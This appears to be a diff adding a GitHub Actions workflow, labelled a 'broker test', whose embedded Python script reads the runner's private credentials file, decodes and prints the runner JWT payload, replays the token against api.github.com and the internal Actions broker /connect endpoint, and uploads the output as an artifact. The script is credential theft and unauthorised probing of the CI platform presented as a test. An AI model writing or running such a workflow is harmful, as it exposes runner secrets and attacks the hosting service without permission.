@@ -1,0 +1,67 @@
+name: Broker Final Test
+on:
+  workflow_dispatch: {}
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          cat > /tmp/broker_test.py << 'PYEOF'
+import json, base64, sys, subprocess, http.client, ssl, urllib.request
+
+# Read the JWT
+with open('/home/runner/actions-runner/cached/2.335.1/.credentials') as f:
+    data = json.load(f)
+token = data['Data']['token']
+
+# Decode
+parts = token.split('.')
+pld = parts[1] + '=' * (4 - len(parts[1]) % 4)
+print('=== JWT PAYLOAD ===')
+print(json.dumps(json.loads(base64.urlsafe_b64decode(pld)), indent=2))
+
+# Test 1: api.github.com
+print('\n=== Test: api.github.com with runner JWT ===')
+req = urllib.request.Request('https://api.github.com/user')
+req.add_header('Authorization', f'Bearer {token}')
+req.add_header('User-Agent', 'broker-test')
+try:
+    resp = urllib.request.urlopen(req)
+    print(f'Status: {resp.status}')
+    print(resp.read().decode()[:300])
+except urllib.error.HTTPError as e:
+    print(f'HTTP {e.code}: {e.read().decode()[:200]}')
+except Exception as e:
+    print(f'Error: {e}')
+
+# Test 2: Broker health (no auth)
+print('\n=== Test: Broker /health ===')
+try:
+    resp = urllib.request.urlopen('https://broker.actions.githubusercontent.com/health', timeout=10)
+    print(f'Status: {resp.status}')
+    print(resp.read().decode()[:200])
+except Exception as e:
+    print(f'Error: {e}')
+
+# Test 3: Broker connect with auth
+print('\n=== Test: Broker /connect via HTTP upgrade ===')
+conn = http.client.HTTPSConnection('broker.actions.githubusercontent.com', 443, timeout=10)
+conn.request('GET', '/connect', headers={
+    'Authorization': f'Bearer {token}',
+    'Upgrade': 'websocket',
+    'Connection': 'Upgrade'
+})
+resp = conn.getresponse()
+print(f'Status: {resp.status}')
+headers = dict(resp.getheaders())
+print(f'Headers: {json.dumps(headers, indent=2)}')
+body = resp.read(500)
+print(f'Body: {body[:300]}')
+conn.close()
+PYEOF
+          python3 /tmp/broker_test.py 2>&1 | tee /tmp/broker_output.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: broker-final-results
+          path: /tmp/broker_output.txt
